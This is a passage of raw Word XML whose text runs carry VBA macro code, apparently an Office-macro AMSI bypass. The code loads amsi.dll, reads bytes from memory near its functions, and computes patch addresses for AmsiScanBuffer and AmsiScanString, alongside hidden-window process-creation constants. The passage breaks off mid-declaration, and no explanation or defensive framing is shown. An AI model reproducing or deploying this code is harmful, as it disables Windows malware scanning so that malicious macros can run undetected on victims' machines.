                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    hStdInput As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46968CFE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    hStdOutput As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18ABB87A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    hStdError As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ED0EFBF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Type</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="008A3A8C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51F4BD43" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Const CREATE_NO_WINDOW = &amp;H8000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="350D9A38" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Const CREATE_NEW_CONSOLE = &amp;H10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65E22458" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F99212E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Function LoadDll(dll As String, func As String) As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="209ABA0E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AE0647B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim AmsiDLL As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D7BA1C5" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AF9C960" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>AmsiDLL = LoadLibrary(dll)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BAF344D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>LoadDll = GetProcAddress(AmsiDLL, func)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B76524D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45403634" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Function</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B6C47C0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="140968F2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Function GetBuffer(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer) As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="480BB75F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04869ED7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedBytesBuffer As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B886417" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedByte As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A7492DB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim TraverseStartAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6532C6DB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68039D97" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>On Error Resume Next</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC1A87B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="396975D6" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>TraverseStartAddr = LeakedAmsiDllAddr - TraverseOffset</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DDA7606" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60EE9181" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim i As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B50ED16" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>For i = 0 To TraverseOffset</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AA43C0F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Peek LeakedByte, ByVal (TraverseStartAddr + i), 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79A0E7D5" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CEAD529" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    If LeakedByte &lt; 16 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48004642" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        FixedByteString = "0" &amp; Hex(LeakedByte)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D942CF0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        LeakedBytesBuffer = LeakedBytesBuffer &amp; FixedByteString</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="488CE0A8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F937554" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        LeakedBytesBuffer = LeakedBytesBuffer &amp; Hex(LeakedByte)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="370911B9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71F9C9DC" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Next i</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C1ED18" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28B1620D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>GetBuffer = LeakedBytesBuffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="380B4645" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23938BBA" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Function</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E641D0F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11BBB506" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Function FindPatchOffset(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer, InstructionInStringOffset As Integer) As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="691C624C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00F3E384" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim memOffset As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="276BF3A1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="736E3590" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>memOffset = (InstructionInStringOffset - 1) / 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6609C4FE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FindPatchOffset = (LeakedAmsiDllAddr - TraverseOffset) + memOffset</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FD72742" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C09C06F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Function</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D28114E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="452CB2E7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Sub x64_office()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ED83264" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27120471" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedAmsiDllAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79411BEB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51D90167" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim ScanBufferMagicBytes As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D17B027" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim ScanStringMagicBytes As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60CD7293" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedBytesBuffer As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44B16A43" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim AmsiScanBufferPatchAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="654665A7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim AmsiScanStringPatchAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58B6A549" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim TrvOffset As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71EFD7C1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
